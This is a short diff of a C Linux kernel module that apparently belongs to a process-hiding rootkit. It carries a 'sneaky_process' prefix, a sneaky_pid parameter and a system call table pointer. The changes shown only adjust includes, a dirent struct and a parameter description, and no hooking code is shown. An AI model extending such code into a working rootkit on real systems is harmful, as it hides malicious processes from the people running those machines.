@@ -12,7 +12,7 @@
 
 #include <linux/unistd.h>        // for system call constants
 #include <linux/version.h>
-//#include <linux/dirent.h>      // Contains dirent structs etc
+#include <linux/dirent.h>      // Contains dirent structs etc
 
 
 #define PREFIX "sneaky_process"
@@ -20,19 +20,11 @@
 // #define handle_error(msg) \
 //                do { perror(msg); exit(EXIT_FAILURE); } while (0)
 
-struct linux_dirent64 {
-               u64        d_ino;    /* 64-bit inode number */
-               s64        d_off;    /* 64-bit offset to next structure */
-               unsigned short d_reclen; /* Size of this dirent */
-               unsigned char  d_type;   /* File type */
-               char           d_name[]; /* Filename (null-terminated) */
-           };
 
 // Command line argument for modules
 MODULE_LICENSE("GPL");
 static char * sneaky_pid = "";
 module_param(sneaky_pid, charp, 0);
-MODULE_PARM_DESC(pid, "sneaky_pid");
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
